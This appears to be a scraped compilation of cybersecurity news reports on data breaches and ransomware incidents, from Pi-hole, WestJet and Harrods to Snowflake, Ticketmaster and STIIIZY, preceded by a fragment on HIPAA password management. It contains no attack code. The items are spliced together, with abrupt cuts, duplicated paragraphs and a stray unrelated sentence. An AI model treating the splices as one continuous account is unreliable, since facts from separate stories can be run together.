industries, healthcare operates in a 24/7 environment where authentication delays or failures can jeopardize patient safety, disrupt critical care delivery, and potentially lead to life-threatening consequences. Doctors need instant access to patient information during emergencies, yet this same accessibility creates vulnerabilities that threat actors actively exploit. New cybersecurity standards have made compliance even more challenging. The National Institute of Standards and Technology (NIST) updated its Digital Identity Guidelines (SP 800-63B) in 2024, shifting away from complex password requirements towards longer, more memorable passphrases while emphasizing multi-factor authentication and breach detection capabilities . These changes align with evolving threat patterns but require healthcare organizations to reassess their existing password policies and technical implementations. There’s another critical challenge — usability. Software must not get in the way of clinical work. Healthcare professionals should be able to start using their new solutions right away — without formal training or disruption to the workflow. For CISOs, Security Directors, and Compliance Officers in healthcare, the priority is clear: create password management strategies that meet HIPAA, follow current security best practices, and fit real clinical workflows. This means knowing both the regulations and the technical tools needed to counter modern threats. ""You can say you make systems secure and compliant. Or you can have operational checks and balances to make sure they actually stay compliant."" — Mitchell Parker , CISO at Temple Health The HIPAA Security Rule establishes a risk-based framework for protecting ePHI. Password management is addressed in both administrative and technical safeguards: 45 CFR § 164.308(a)(5)(ii)(D): Administrative Safeguards – Security Awareness and Training (Password Management) 45 CFR § 164.312(d): Technical Safeguards – Person or Entity Authentication These statutes require covered entities and business associates to implement policies and procedures that ensure only authorized individuals have access to ePHI, and that authentication mechanisms are properly managed and secured. This section mandates that organizations implement “Procedures for creating, changing, and safeguarding passwords.” Formal password policies. Documented procedures covering password creation, modification, and protection. User training. Continuous training on password security, including the recognition of social engineering attacks and the importance of unique, complex passwords. Risk-based approach. The Security Rule requires organizations to conduct a risk analysis to determine appropriate password controls based on the nature of their systems and user access patterns. Documentation. All procedures, risk assessments, and policy decisions must be documented and retained for six years. ""Security has always been a people issue. The toughest security problem is getting people to understand"" — Jigar Kadakia , CISO at Partners HealthCare This section requires “Implement procedures to verify that a person or entity seeking access to electronic protected health information is the one claimed.” In practice, this means: Authentication mechanisms. Organizations must deploy technical controls to authenticate users. Accountability. Systems must log authentication events and support audit trails to detect and investigate unauthorized access. Scalability and integration. Authentication controls must work across diverse healthcare IT systems, including EHRs, medical devices, and cloud services. Required. These are mandatory. Failure to implement them constitutes non-compliance. Addressable. Organizations must assess whether the specification is reasonable and appropriate in their environment. If not, they must document why and implement an equivalent alternative. As for password management, many controls (such as unique user IDs) are required, while others (such as automatic logoff) are addressable. However, the burden of proof lies with the organization, which must justify its decisions, document them, and periodically review their effectiveness. Choosing a password manager is an important step for healthcare providers. A well-chosen password manager does more than just store credentials — it becomes a foundation of cybersecurity strategy, protecting sensitive information while empowering users with seamless access management. Encryption. A password manager must use end-to-end encryption to ensure that passwords are inaccessible to unauthorized parties and can be decrypted only by the intended recipient. Secure architecture. A solution should operate on a zero-knowledge architecture, meaning that even the service provider must not be able to access or decipher confidential data. Access management. A password manager should support role-based access control (RBAC), allowing administrators to define and enforce permissions based on user responsibilities. Audit trails. Detailed logs should make it possible for administrators to track user actions, identify potential security issues, and ensure compliance with regulatory requirements. User experience. The solution should offer an intuitive interface and seamless integration with existing systems, minimizing the learning curve for users. Features like auto-fill, password generation, and centralized management should be simple to navigate. This matters in healthcare, where staff spend up to 45 minutes per shift just logging into different systems. Scalability and performance. A solution should male it possible to manage credentials for thousands of users across hundreds of applications, including electronic health records, medical devices, administrative systems, and third-party cloud services. Focusing on these features helps to choose a password manager that keeps organizations secure and easy to control. A good solution balances strong protection with a straightforward experience, reducing risks and encouraging better security habits. Selecting a password manager for healthcare institutions means meeting the highest standards of security, and regulatory compliance. At the same time, it should fit seamlessly into employees’ workflows, as overly complex tools risk immediate rejection — staff will normally find risky workarounds when systems are too complicated.

Pi-hole discloses data breach triggered by WordPress plugin flaw,https://www.bleepingcomputer.com/news/security/pi-hole-discloses-data-breach-via-givewp-wordpress-plugin-flaw/,Sergiu Gatlan,"August 1, 2025","Pi-hole, a popular network-level ad-blocker, has disclosed that donor names and email addresses were exposed through a security vulnerability in the GiveWP WordPress donation plugin. Pi-hole acts as a DNS sinkhole, filtering out unwanted content before it reaches the users' devices. While initially designed to run on Raspberry Pi single-board computers, it now supports various Linux systems on dedicated hardware or virtual machines. The organization stated that they first learned of the incident on Monday, July 28, after donors began reporting that they were receiving suspicious emails at addresses used exclusively for donations . As explained in a Friday post-mortem , the breach affected users who donated through the Pi-hole website's donation form to support development, exposing personal information that was visible to anyone who viewed the webpage's source code due to a GiveWP security flaw. The vulnerability stemmed from GiveWP, a WordPress plugin used to process donations on the Pi-hole website. The plugin inadvertently made donor information publicly accessible without requiring authentication or special access privileges. While Pi-hole didn't disclose the number of affected customers, the 'Have I Been Pwned' data breach notification service added the Pi-hole breach, saying that it impacted almost 30,000 donors, with 73% of the exposed records already in its database. Pi-hole added that no donor financial data was compromised, as credit card information and other payment details are handled directly by Stripe and PayPal. It also clarified that the Pi-hole software product itself was not affected in any way. ""We make it clear in the donation form that we don't even require a valid name or email address, it's purely for users to see and manage their donations,"" Pi-hole said . ""It is also important to note that Pi-hole the product is categorically not the subject of this breach. There is no action needed from users with a Pi-hole installed on their network."" Although GiveWP released a patch within hours of the vulnerability being reported on GitHub, Pi-hole criticized the plugin developer's response, citing a 17.5-hour delay before notifying users and what it described as insufficient acknowledgment of the security flaw's potential impact on donor names and email addresses. Pi-hole apologized to affected donors and acknowledged potential reputation damage stemming from this security incident, saying that while the vulnerability was unforeseeable, they accept accountability for the resulting data breach. ""The names and email addresses of anyone that had ever donated via our donation page was there for the entire world to see (provided they were savvy enough to right click->View page source).

Since at least January 2025, if not earlier, threat actors have been conducting social engineering and phishing campaigns targeting companies' employees and help desks. These attacks are designed to steal Salesforce credentials or trick employees into authorizing a malicious OAuth application to their Salesforce account. Using this access, the threat actors download and steal the company's Salesforce database, which is then used to extort the company into paying a ransom to prevent the data from being leaked. ShinyHunters confirmed to BleepingComputer that they are privately extorting companies and will perform a mass sale or leak of companies that do not pay a ransom in the future, like they did in the Snowflake data-theft attacks . The threat actor also confirmed that the attacks are ongoing , so all companies should review Salesforce's recommendations on hardening their accounts. ""Salesforce has not been compromised, and the issues described are not due to any known vulnerability in our platform.

WestJet data breach exposes travel details of 1.2 million customers,https://www.bleepingcomputer.com/news/security/westjet-data-breach-exposes-travel-details-of-12-million-customers/#comments,Bill Toulas,"October 1, 2025","This story was updated with new information on the number of customers impacted. Canadian airline WestJet is informing customers that the cyberattack disclosed in June compromised the personal information of 1.2 million customers, including passports and ID documents. WestJet is a major airline in North America, operating a fleet of 153 aircraft and serving 104 destinations, which carry over 25 million travelers annually. On June 13, the company disclosed a cybersecurity incident that disrupted internal systems and made the WestJet app unavailable to customers. Around that time, threat actors associated with Scattered Spider were focusing their attacks on organizations in the aviation industry. However, there is no official attribution for the hackers behind the WestJet breach. Soon after the attack, BleepingComputer learned that the threat actors breached WestJet by using social engineering to reset an employee's password and gain access to the network through Citrix. This allowed the attackers to compromise the Windows networks and the company's Microsoft cloud network. The WestJet data breach In the days following the disclosure, WestJet published multiple updates , assuring customers that all appropriate measures to protect their data were being implemented. However, the communications did not specify whether the hackers had managed to access any sensitive information. In a data breach notification sent to customers and shared with authorities in the U.S., the company has confirmed the impact after completing an investigation on September 15. WestJet also confirmed to the Maine Attorney General's Office that the breach allowed the attackers to steal the data for approximately 1.2 million customers. According to the findings, the following data types have been exposed to the attackers, varying per individual: WestJet specified that no credit card or debit card numbers, expiry dates, CVV numbers, or user passwords were compromised. The airline noted that recipients of the notification should inform other individuals who may have flown under the same booking number as them, as their information might have been exposed too. WestJet states that it is still determining the full scope of the incident, so this initial notice is being circulated to those confirmed to be impacted. However, it may not represent the complete impact of the compromise. ""We continue to work alongside our technical experts to determine the full extent of the incident,"" reads the letter. ""While investigations of this nature are complicated and take time to complete, we have worked as quickly as possible to review the data we understand to be involved and to ascertain whether any of your personal information has been involved."" The company also stated that the FBI is involved in the investigations and that it has taken all the appropriate measures to prevent similar incidents from occurring in the future. The notices also enclose instructions on how to enroll in a free 2-year identity theft protection and monitoring service, redeemable by November 30. As MCP (Model Context Protocol) becomes the standard for connecting LLMs to tools and data, security teams are moving fast to keep these new services safe.

In a statement for BleepingComputer, the luxury department store noted that the latest incident is not related to the May cyberattack , which was attributed to Scattered Spider. Back in May, Harrods was the target of a failed cyberattack as the luxury goods company was quick to take proactive action and block the hackers from gaining access to its systems. That week, Harrods was the third retailer that Scattered Spider targeted, after Marks and Spencer and Co-op . In both incidents, the threat actor used the DragonForce ransomware to encrypt stystem data [ 1 , 2 ]. Harrods is a London-based luxury goods department store. It operates a full-featured e-commerce platform catering to international customers. The recent data breach was first reported by media outlets in the U.K. after Harrods notified customers impacted by the incident. Harrods told BleepingComputer that it ""proactively informed affected e-commerce customers on Friday"" that their names and contact details were compromised following a breach at a third-party provider. The company did not disclose the name of compromised entity. It should be mentioned that hundreds of companies across the world have been impacted by the Salesloft supply-chain attack towards the end of the summer, where hackers used stolen OAuth tokens to pivot to customers' Salesforce environments and exfiltrate data. Since late August , multiple companies started to disclose that customer info was at least exposed due to this incident. Apart from names and contact details, some customer records also included tags and labels used internally for marketing and other services that Harrods provides. “Affected customer records may also have labels related to marketing and services delivered by Harrods,” the luxuy goods company says. “These labels may include tier level or affiliation to a Harrods co-branded card, although this information is unlikely to be interpreted accurately by an unauthorised third party.” Co-branded cards are credit cards part of the company's loyalty program that have Harrods' logo and those of a card network (American Express, Visa) and a financial institution (QNB, NBK). They can be used to earn reward points and include various benefits, like dining credits and access to special events. Despite the data exposure, Harrods underlined that the leaked data does not include account passwords, payment information, or order histories, and is limited to basic personal identifiers. The company also noted that the threat actor has contacted them directly, likely in an attempt to extort them, but stated that it would not engage in communication. The historic shop continues its efforts to inform and support exposed customers, and has notified all relevant authorities accordingly, working closely with them. Customers of Harrod’s online shop should stay vigilant for phishing attacks and social engineering, and avoid clicking on links sent via email or SMS from unknown contacts.

Integris Health patients get extortion emails after cyberattack,https://www.bleepingcomputer.com/news/security/integris-health-patients-get-extortion-emails-after-cyberattack/#comment_form,Lawrence Abrams,"December 26, 2023","Integris Health patients in Oklahoma are receiving blackmail emails stating that their data was stolen in a cyberattack on the healthcare network, and if they did not pay an extortion demand, the data would be sold to other threat actors. Integris Health is Oklahoma's largest not-for-profit health network, operating hospitals, clinics, and urgent care throughout the state. The healthcare network confirmed they suffered a cyberattack in November that led to the theft of patient data. ""INTEGRIS Health discovered potential unauthorized activity on certain systems,"" reads a data privacy notice on Integris Health's website. ""Upon becoming aware of the suspicious activity, INTEGRIS Health promptly took steps to secure the environment and commenced an investigation into the nature and scope of the activity."" ""The investigation determined that certain files may have been accessed by an unauthorized party on November 28, 2023."" BleepingComputer has contacted Integris Health with questions about the attack but has not received a response. In extortion emails sent to patients on December 24th, the hackers claim they stole the personal data of over 2 million patients in the cyberattack on Integris Health. This data allegedly includes Social Security Numbers, dates of birth, addresses, phone numbers, insurance information, and employer information. BleepingComputer was told by patients of Integris Health that these emails contained accurate personal information, confirming that patient data was stolen in the attack. ""We have contacted Integris Health, but they refuse to resolve this issue,"" reads the extortion email sent to Integris patients. ""We give you the opportunity to remove your personal data from our databases before we sell the entire database to data brokers on Jan 5 2024."" The emails include a link to a Tor extortion site that currently lists the stolen data for approximately 4,674,000 people, including their names, Social Security Numbers, dates of birth, and information about hospital visits. The website contains data added between October 19th and December 24th, 2023, allowing visitors to pay $50 to delete the data record or $3 to view it. BleepingComputer has determined that the website has approximately 4,674,000 data records. However, it is unclear if any are duplicates. Integris Health is aware of the emails sent to patients and has updated its security notice to warn recipients not to respond, contact the sender, or click on any of the links in the email. While it is not known who is behind the attack on Integris Health, similar emails were sent to Fred Hutchinson Cancer Center (Fred Hutch) patients after the Hunters International ransomware gang breached the hospital . The Fred Hutch emails also allowed patients to visit a dark website and delete their data by paying $50, making it likely that the same ransomware attack is behind the attack on Integris Health. As threat actors can use the exposed data to conduct identity theft, some patients may be tempted to pay to delete the data. However, as previous extortion demands have shown , paying a ransom does not always lead to the actual deletion of data. Furthermore, once you pay a ransom, the threat actors know you are concerned about the data and may attempt to extort you further.

ARRL has not linked the attack to a specific ransomware gang, but sources told BleepingComputer that the Embargo ransomware operation was behind this incident.

The two companies were added to ALPHV's dark web leak site today, with the threat actors still having to publish proof of their claims. ALPHV plans to sell the stolen data from loanDepot's network and release Prudential's data for free after failed negotiations. loanDepot revealed on January 22 that at least 16.6 million people had their personal information stolen in the ransomware attack they confirmed on January 8 , two days after disclosing it as a ""cyber incident"" on January 6 . The company said it would notify those impacted by the data breach and provide them with free credit monitoring and identity protection services. loanDepot is one of the largest U.S. nonbank retail mortgage lenders, with roughly 6,000 employees and over $140 billion in serviced loans. On Tuesday, Prudential Financial also revealed that a suspected cybercrime group breached its network on February 4 and stole employee and contractor data. Prudential said an ongoing investigation assesses the incident's full scope and impact but has yet to find evidence that the attackers also exfiltrated customer or client data. This leading global financial services Fortune 500 company is the second-largest life insurance company in the U.S., with reported revenues of more than $50 billion in 2023, and it employs 40,000 people worldwide. ​On Thursday, the U.S. State Department announced rewards of up to $10 million for tips that could lead to the identification or location of ALPHV gang leaders. An additional $5 million reward is offered for information on individuals linked to or attempting to participate in ALPHV ransomware attacks.

The law enforcement agency also estimates that ALPHV raked in at least $300 million in ransom payments from over 1,000 victims until September 2023. ALPHV surfaced in November 2021 and is believed to be a rebrand of the DarkSide and BlackMatter ransomware operations. The group gained worldwide notoriety after the Colonial Pipeline attack, which led to extensive investigations by law enforcement agencies worldwide and the operation going through two rebrands.

Yesterday, the Underground ransomware group claimed responsibility for the attack, leaking various documents allegedly stolen from the Japanese tech giant's systems. Today, after the data was leaked, Casio published a new statement that admits that sensitive data was stolen during the attack on its network. As to the current results of its ongoing investigation, Casio says the following information has been confirmed as likely compromised: Regarding customer data specifically, Casio specifies that the exposed set does not include credit card information, as payment data isn't stored on its systems. Also, the Japanese firm says service systems like CASIO ID and ClassPad.net were not affected by the incident, as they are not hosted on the breached server infrastructure. As the investigation continues, the scope of the impact will likely broaden, and those who believe they might be affected are advised to remain vigilant against unsolicited emails. Casio also requests internet users to avoid sharing any leaked information online, as that only worsens the situation for those affected by the data breach. ""Please refrain from spreading this information through social media, etc., as it could increase the damage caused by the leak of information on this case, violate the privacy of those affected, have serious effects on their lives and businesses, and encourage crime,"" says the updated Casio statement .

US indicts Snowflake hackers who extorted $2.5 million from 3 victims,https://www.bleepingcomputer.com/news/security/us-indicts-snowflake-hackers-who-extorted-25-million-from-3-victims/#comments,Bill Toulas,"November 13, 2024","The U.S. Department of Justice has unsealed the indictment against two suspected Snowflake hackers, who breached more than 165 organizations using the services of the Snowflake cloud storage company. Connor Riley Moucka and John Erin Binns are accused of using credentials, obtained with the help of info-stealing malware, to hijack Snowflake accounts that were not protected by multi-factor authentication Moucka and Binns exfiltrated terabytes of data from various companies and demanded ransom payments in exchange for deleting the stolen information. According to the indictment, the two hackers stole ""approximately 50 billion customer call and text records"" from a ""major telecommunications"" company in the U.S. One company fitting the profile that suffered a major data breach in the same timeframe as described in the indictment is AT&T. AT&T disclosed in July that call logs of 109 million customers were exposed during the incident and that the data was accessed from an online database on the company's Snowflake account. As per the indictment , Moucka and Binns received around mid-May a ransom payment from the telco provider in the form of cryptocurrency. They tried to hide the source and destination of the funds through ""a complex series of cryptocurrency transactions,"" which included converting the payments into Monero cryptocurrency. With some victims, the attackers engaged in double extortion, where they tried to get a new ransom payment from a breached company that had already paid the initial demand. The court document notes that the two hackers and their co-conspirators extorted three victims for at least 36 Bitcoins, or $2.5 million at transaction time. Apart from AT&T, data breaches linked to Snowflake attacks affected hundreds of millions of individuals, customers of Ticketmaster , Santander , Pure Storage , Advance Auto Parts , Los Angeles Unified , QuoteWizard/LendingTree , and Neiman Marcus . To make a profit with the data stolen from victims that did not pay the ransom, the hackers advertised it to potential buyers on multiple hacking forums. Moucka (aka “Waifu” and “Judische”) was arrested in late October 2024 in Canada at the request of the United States, who suspected the man of having masterminded the data theft operation that impacted over 165 organizations. The other hacker was arrested in Turkey this year in May and his name is John Erin Binns (aka “irdev” and “j_irdev1337”), who in 2021 claimed the major attack on T-Mobile and mocked the company's security in interviews to the media. The two now face multiple counts for various cybercrime charges, including wire fraud, securities fraud, conspiracy to commit fraud, unauthorized access and breach of computer systems, data theft, and privacy violations. If convicted, the two could face significant prison sentences, as the announced charges carry from 5 to up to 25 years of imprisonment each, and a total of 60 years. Additionally, the two will have their assets and proceeds seized by the government, including bank accounts, vehicles, real estate, and any other valuables obtained as a result of the alleged offenses.

Apart from AT&T, data breaches linked to Snowflake attacks affected hundreds of millions of individuals, customers of Ticketmaster , Santander , Pure Storage , Advance Auto Parts , Los Angeles Unified , QuoteWizard/LendingTree , and Neiman Marcus . To make a profit with the data stolen from victims that did not pay the ransom, the hackers advertised it to potential buyers on multiple hacking forums. Moucka (aka “Waifu” and “Judische”) was arrested in late October 2024 in Canada at the request of the United States, who suspected the man of having masterminded the data theft operation that impacted over 165 organizations. The other hacker was arrested in Turkey this year in May and his name is John Erin Binns (aka “irdev” and “j_irdev1337”), who in 2021 claimed the major attack on T-Mobile and mocked the company's security in interviews to the media. The two now face multiple counts for various cybercrime charges, including wire fraud, securities fraud, conspiracy to commit fraud, unauthorized access and breach of computer systems, data theft, and privacy violations. If convicted, the two could face significant prison sentences, as the announced charges carry from 5 to up to 25 years of imprisonment each, and a total of 60 years. Additionally, the two will have their assets and proceeds seized by the government, including bank accounts, vehicles, real estate, and any other valuables obtained as a result of the alleged offenses.

Dallas County is the second largest county in Texas, with over 2.6 million residents. In October 2023, the Play ransomware gang added Dallas to its extortion portal on the dark web, threatening to leak data it stole during an attack on its systems, including private documents from various departments. Dallas acknowledged the incident via a statement on its site a few days later and assured the public they were reviewing the leaked data when Play published it in early November. As the leaked data review took a lot of time and people were concerned, Dallas set up a dedicated call center in January 2024. Yesterday, Dallas County posted an update about the incident on its website and sent data breach notices to 201,404 impacted individuals , including Dallas residents, employees, and others who interacted with its public services. The types of data confirmed to have been exposed vary per individual and include the following: Those whose SSNs and taxpayer identification numbers were exposed will receive two years of credit monitoring and identity theft protection services. In response to the breach, Dallas County has implemented several security-strengthening measures on its networks, including deploying Endpoint Detection and Response (EDR) solutions across all servers, forcing password resets, and blocking malicious/suspicious IP addresses. Dallas County and the City of Dallas have both dealt with several damaging cybersecurity incidents recently.

A spokesperson for the firm told BleepingComputer that the incident impacts Dior Fashion and Accessories customers. Currently, cybersecurity experts are investigating the incident to determine its scope. “The House of Dior recently discovered that an unauthorized external party accessed some of the data we hold for our Dior Fashion and Accessories customers,” stated the spokesperson. “We immediately took steps to contain this incident. The teams at Dior, supported by leading cybersecurity experts, continue to investigate and respond to the incident.” Dior clarified to BleepingComputer that the incident did not expose account passwords or payment card information, as these were stored in a different database that remained unaffected. “No passwords or payment information, including bank account or payment card information, were in the database affected in the incident.” “We are working to notify relevant regulators and customers in line with applicable law.” “The confidentiality and security of our customers’ data is an absolute priority for the House of Dior.

Panera Bread likely paid a ransom in March ransomware attack,https://www.bleepingcomputer.com/news/security/panera-bread-likely-paid-a-ransom-in-march-ransomware-attack/,Lawrence Abrams,"June 17, 2024","Panera Bread, an American chain of fast food restaurants, most likely paid a ransom after being hit by a ransomware attack, suggests language used an internal email sent to employees. Last week, Panera began sending data breach notifications to employees, warning that threat actors stole personal information in a March cyberattack that included names and social security numbers. While Panera has not publicly disclosed details about their attack, BleepingComputer first reported that Panera Bread suffered a ransomware attack that encrypted all of its virtual machines. The attack led to a week-long, company-wide disruption that affected their website, phone systems, mobile app, point-of-sale, and internal systems. BleepingComputer later learned that one of their storage servers was not encrypted in the attack, allowing the company to rebuild and restore servers from backups. However, no ransomware gang ever claimed the attack or leaked stolen data, indicating that a ransom was paid. Just as the data breach notifications were being emailed on Thursday, an alleged employee claimed on Reddit that Panera paid a ransom to have the hackers delete the stolen data and avoid a public leak. ""This probably will not make it far but just got out of a corporate meeting where they broke to us that all our data has been stolen since march and they paid the hackers to ""not release"" its employees data,"" reads the Reddit thread by an alleged Panera employee. The anonymous employee also shared an internal email from Panera Senior Vice President KJ Payette, which backs up the ransom payment claim by stating that Panera obtained assurances that stolen data was deleted and would not be published. ""Please note that we obtained assurances that the information involved was deleted and will not be published. As of now, there is no indication that the information accessed has been made publicly available,"" reads an internal Panera email sent to employees. During ransomware attacks, threat actors breach a company and then quietly spread throughout its network while stealing corporate data. Once they gain administrative privileges on the network, they deploy the encryptor to encrypt all devices. The threat actors use the stolen data and encrypted files as leverage to force companies to pay a ransom, promising to deliver a decryptor and delete any data that was stolen in the attack. It is highly unlikely that Panera could receive assurances that data was deleted and would not be published unless it came directly from the threat actors after a ransom demand was paid. Furthermore, even if law enforcement were able to intercept the server hosting the data, there would be no way of knowing if a copy of the data was stored elsewhere by the threat actors. Sadly, even paying a ransom does not guarantee the complete deletion of stolen data, with past incidents demonstrating that threat actors don't always keep their promise and data was sold to other threat actors, leaked on data leak sites, or used to extort the company again. This was seen recently with the BlackCat ransomware attack on United Healthcare when the company paid a $22 million ransom demand to receive a decryptor and have stolen data deleted. However, after BlackCat stole the ransom payment without paying the affiliate behind the attack, the affiliate said they never deleted the data and again extorted United Healthcare, stating that they would sell the data to other threat actors unless another payment was made. To prove they still held the data, the threat actors leaked samples on another ransomware gang's data leak site, Ransom Hub. Eventually, the data leak for United Healthcare disappeared from this data leak site, indicating another ransom was likely paid. For this reason, ransomware negotiators have told BleepingComputer in the past that companies should never pay a ransom to delete stolen data, as there is no guarantee this will be done. BleepingComputer contacted Panera Bread to confirm if they paid the ransom but did not receive a response.

AT&T pays $13 million FCC settlement over 2023 data breach,https://www.bleepingcomputer.com/news/security/atandt-pays-13-million-fcc-settlement-over-2023-data-breach/,Sergiu Gatlan,"September 17, 2024","The Federal Communications Commission (FCC) has reached a $13 million settlement with AT&T to resolve a probe into whether the telecom giant failed to protect customer data after a vendor's cloud environment was breached three years ago. The FCC's investigation also examined AT&T's supply chain integrity and whether the telecom giant engaged in poor privacy and cybersecurity practices. The massive data breach investigated by the FCC occurred in January 2023 , when threat actors accessed customer data of roughly 9 million AT&T wireless accounts stored by a vendor contracted to generate personalized video content, including billing and marketing videos. ""Customer Proprietary Network Information from some wireless accounts was exposed, such as the number of lines on an account or wireless rate plan,"" AT&T told BleepingComputer at the time. ""The information did not contain credit card information, Social Security Number, account passwords or other sensitive personal information. We are notifying affected customers."" The CPNI data exposed in the January 2023 breach included customer first names, wireless account numbers, phone numbers, and email addresses. Even though the vendor was required to destroy or return the data after the contract ended—years before the breach—it failed to do so. AT&T was found to have inadequately monitored the vendor's compliance with their contractual obligations. ""Carriers must take additional precautions given their access to sensitive information, and we will remain vigilant in ensuring that's the case no matter which provider a customer chooses."" To settle the investigation, AT&T has also agreed to strengthen its data governance practices to protect its consumers' sensitive data against similar vendor data breaches in the future. The consent decree mandates AT&T to implement a comprehensive Information Security Program that includes broad customer data protection, improve its data inventory processes to track data shared with vendors, ensure that vendors follow retention and disposal rules for customer information (to limit the amount of customer data vulnerable to date breaches), and conduct annual compliance audits to assess AT&T's compliance with these requirements. ""The Communications Act makes clear that carriers have a duty to protect the privacy and security of consumer data, and that responsibility takes on new meaning for digital age data breaches,"" said FCC Chairwoman Jessica Rosenworcel. ""Carriers must take additional precautions given their access to sensitive information, and we will remain vigilant in ensuring that's the case no matter which provider a customer chooses."" Enforcement Bureau Chief Loyaan A.

WSU is a prominent Australian institution offering various undergraduate, postgraduate, and research programs across multiple disciplines. It serves a student body of 47,000 and employs over 4,500 permanent and seasonal staff, operating with an annual budget of approximately $600 million. One of the incidents disclosed concerns the compromise of one of the University’s single sign-on (SSO) systems between January and February 2025. This breach has reportedly led to the unauthorized access of demographic, enrollment, and progression information for approximately 10,000 current and former students. The university states that it took immediate action to block the attacker once it became aware of the breach, and investigations into the incident are ongoing. The second cybersecurity incident concerns a leak on the dark web of personal information belonging to members of the University’s community. Although that hackers published the data on November 1, 2024, WSU only became aware of it this year on March 24. The attacker's wording in the post is vague, but the university's announcement mentions that it “broadly reflects the same types of personal information outlined in previous cyber notifications.” Between the security incidents, the educational institute suffered another data breach in May 2023 , which it discovered and disclosed it a year later, informing its community that hackers had accessed its Microsoft Office 365 environment, including email accounts and SharePoint files. That incident was later estimated to have impacted 7,500 individuals, exposing names, contact details, dates of birth, health information, government ID numbers, and bank account information. The investigation revealed that the hackers maintained access to WSU’s networks between July 9, 2023, and March 16, 2024, obtaining access to 580 terabytes of data. It is unclear if the post published on the dark web in November 2024 contains information stolen during that incident, or if it concerns a separate case altogether. BleepingComputer has contacted WSU to ask for clarifications on that topic, but we are still waiting for their response. Given the situation with repeated breaches and sensitive data leaked online, Vice-Chancellor and President George Williams issued an apology. “The University is very aware of the personal impact these incidents are having on its students, staff, and wider community,” Williams stated. “On behalf of the University, I apologize to our community.

The tickets were leaked by a threat actor known as 'Sp1derHunters,' who is selling data stolen in recent data theft attacks from Snowflake accounts. In April, threat actors began downloading Snowflake databases of at least 165 organizations using credentials stolen by information-stealing malware. In May, a well-known threat actor named ShinyHunters began selling the alleged data of 560 million Ticketmaster customers , claiming it was stolen from Snowflake. Ticketmaster later confirmed that its data was stolen from their Snowflake account. At the time, the threat actors demanded that Ticketmaster pay them $500,000 so that the data would not be leaked or sold to other threat actors. However, a week ago, the same threat actors leaked 166,000 Taylor Swift ticket barcodes , demanding a higher $2 million extortion demand. Ticketmaster responded by saying that the data is useless as their anti-fraud measures constantly rotate to unique mobile barcodes. ""Ticketmaster's SafeTix technology protects tickets by automatically refreshing a new and unique barcode every few seconds so it cannot be stolen or copied,"" Ticketmaster told BleepingComputer. Today, Sp1d3rHunters responded to Ticketmaster's statement, saying that numerous print-at-home tickets were stolen whose barcodes cannot be rotated. ""Ticketmaster lies to the public and says barcodes can not be used. Tickets database includes both online and physical ticket types,"" the threat actor posted to a hacking forum. ""Physical ticket types are Ticketfast, e-ticket, and mail. These are printed and can not be automatically refreshed."" The post includes a link to a CSV file containing the barcode data for 38,745 TicketFast tickets, Ticketmaster's print-at-home ticketing solution. A review of the data by BleepingComputer shows ticket data for 154 events and concerts, including those for Aerosmith, Alanis Morissette, Billy Joel & Sting, Bruce Springsteen, Carrie Underwood, Cirque du Soleil, Dave Matthews Band, Foo Fighters, Metallica, Pearl Jam, Phish, P!NK, Red Hot Chili Peppers, Stevie Nicks, STING, Tate McRae, and $uicideboy$. When purchasing tickets through Ticketmaster, you can accept delivery through TicketFast at some venues and events. Using this delivery method, your tickets will be sent as a PDF via email, which you can then print out and bring with you to the event. As these are not mobile tickets, the threat actors claim that Ticketmaster cannot rotate the barcodes using its disclosed anti-fraud mechanism. Instead, they must void and reissue the tickets to those who used the service. The threat actors also included a guide on converting the leaked ticket data into a scannable barcode that can be used to create tickets using TicketFast print-at-home templates that corporate customers use. BleepingComputer contacted Ticketmaster to confirm how they would handle these tickets but has not received a response yet. The threat actors have previously attempted to extort numerous other companies whose Snowflake data was stolen, including Neiman Marcus , Los Angeles Unified School District , Advance Auto Parts , Pure Storage , and Satander .

A review of the data by BleepingComputer shows ticket data for 154 events and concerts, including those for Aerosmith, Alanis Morissette, Billy Joel & Sting, Bruce Springsteen, Carrie Underwood, Cirque du Soleil, Dave Matthews Band, Foo Fighters, Metallica, Pearl Jam, Phish, P!NK, Red Hot Chili Peppers, Stevie Nicks, STING, Tate McRae, and $uicideboy$. When purchasing tickets through Ticketmaster, you can accept delivery through TicketFast at some venues and events. Using this delivery method, your tickets will be sent as a PDF via email, which you can then print out and bring with you to the event. As these are not mobile tickets, the threat actors claim that Ticketmaster cannot rotate the barcodes using its disclosed anti-fraud mechanism. Instead, they must void and reissue the tickets to those who used the service. The threat actors also included a guide on converting the leaked ticket data into a scannable barcode that can be used to create tickets using TicketFast print-at-home templates that corporate customers use. BleepingComputer contacted Ticketmaster to confirm how they would handle these tickets but has not received a response yet. The threat actors have previously attempted to extort numerous other companies whose Snowflake data was stolen, including Neiman Marcus , Los Angeles Unified School District , Advance Auto Parts , Pure Storage , and Satander .

STIIIZY is a a California-based cannabis brand known for its pod-based vaporizers and a variety of cannabis products, including flower, edibles, THC concentrates, and extracts. In a data breach notification published earlier this week, STIIIZY says it first suffered a data breach on November 20 when notified by its POS vendor. ""On November 20, 2024, we were notified by a vendor of point-of-sale processing services for some of our retail locations that accounts with their organization had been compromised by an organized cybercrime group,"" reads the data breach notification published to STIIIZY's site. ""An investigation conducted by the vendor revealed that personal information relating to certain STIIIZY customers processed by the vendor was acquired by the threat actors on or around October 10, 2024 - November 10, 2024."" As part of the breach, the threat actors stole a wide range of sensitive customer information, including driver's license information, passport numbers, photographs, and transaction histories. ""The incident impacted information contained on government-issued identification cards, including drivers' licenses and medical cannabis cards, as well as information related to transactions with our dispensaries,"" warns the company. ""The categories of information compromised include name, address, date of birth, age, drivers' license number, passport number, photograph, the signatures appearing on a government ID card, medical cannabis cards, transaction histories, and other personal information.

STIIIZY says their investigation indicates that the breach only affected customers who made purchases at the following stores: The company says they have implemented additional security measures to protect customer data and will offer free credit monitoring services to those impacted. Due to the sensitive nature of the stolen data, impacted customers are also advised to monitor their credit history for fraudulent accounts opened under their name and to be on the lookout for targeted phishing attacks. While STIIIZY has not shared any details on the vendor and how the data was stolen, a ransomware gang known as ""Everest"" claimed in November to have breached the company and stolen the personal data and IDs of 422,075 customers. BleepingComputer contacted STIIIZY with further questions about the breach and will update this story if we hear back. The Everest gang also shared screenshots of the allegedly stolen data, which included scans of driver's licenses, customer profiles, medical marijuana cards, customer profiles, and company documents. The Everest ransomware operation launched in 2020 and has had an interesting progression of malicious activity. When first launched, the group primarily breached corporate networks to steal data and extort victims on its data leak site. Over time, the threat actors introduced ransomware into their attacks to not only steal data but also encrypt the company's files in double-extortion attacks.

